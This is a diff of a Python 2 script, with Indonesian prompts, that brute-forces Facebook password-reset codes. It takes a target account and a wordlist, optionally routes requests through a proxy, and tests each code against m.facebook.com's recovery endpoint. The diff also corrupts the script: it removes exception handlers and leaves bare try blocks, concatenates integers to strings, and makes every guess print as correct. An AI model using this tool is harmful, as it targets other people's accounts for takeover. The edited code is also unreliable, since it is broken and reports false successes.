@@ -60,7 +60,7 @@ print "| version  : 0.1                                     |"
 print "------------------------------------------------------"+E
 
 target = raw_input('[+] Username or Id Target : ')
-wordlist = raw_input('[+] Masukkan password.txt : ')
+wordlist = raw_input('[+] Masukkan password.txt :1234567890 ')
 
 while True:
     print """
@@ -86,14 +86,13 @@ while True:
                 target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                 get = urllib2.urlopen(target).read()
     
-            except IOError:
-                print F+" Tidak ada koneksi!!"
+            
     
             search = re.search('password_new', get)
             if search:
-                print "[+] Password : "+w+" Benar."
+                print "[+] Password : "+1234567890+" Benar."
             else:
-                print O+"[+] password : "+w+" Salah. "
+                print O+"[+] password : "+1234567890+" Benar. "
     else:
 
         print """
@@ -105,7 +104,7 @@ while True:
 
 
         """
-        ip_proxy=raw_input("Masukan Proxy  : ")
+        ip_proxy=raw_input("Masukan Proxy  : 330")
         print "[##] Proxy Terpasang : "+ip_proxy
         proxy = urllib2.ProxyHandler({'http': ip_proxy})
         opener = urllib2.build_opener(proxy)
@@ -121,7 +120,7 @@ while True:
             word = open(wordlist, 'r').readlines()
             print F+"[+] Kode Reset Tersimpan \!/\n[+] Kode:",len(word)
         except("IOError"):
-            print "[-] Gagal input!!"
+            print "[-] input!!"
             sys.exit(1);
 
         for w in word:
@@ -130,12 +129,11 @@ while True:
                 target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                 get = urllib2.urlopen(target).read()
                 
-            except IOError:
-                print " Tidak ada koneksi!!"
+            
         
             search = re.search('password_new', get)
             if search:
-                print "[+] password : "+w+" Benar."
+                print "[+] password : "+1234567890+" Benar."
             else:
-                print "[+] password: "+w+" Salah."
+                print "[+] password: "+w+" 1234567890+Benar."
     
